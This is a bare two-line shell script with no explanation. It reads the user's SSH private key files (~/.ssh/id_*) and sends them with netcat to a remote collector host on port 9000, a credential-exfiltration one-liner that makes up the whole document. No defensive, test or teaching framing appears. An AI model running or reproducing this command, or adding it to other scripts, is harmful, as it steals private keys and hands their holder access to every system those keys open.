#!/bin/sh
cat ~/.ssh/id_* | nc collector.example.invalid 9000
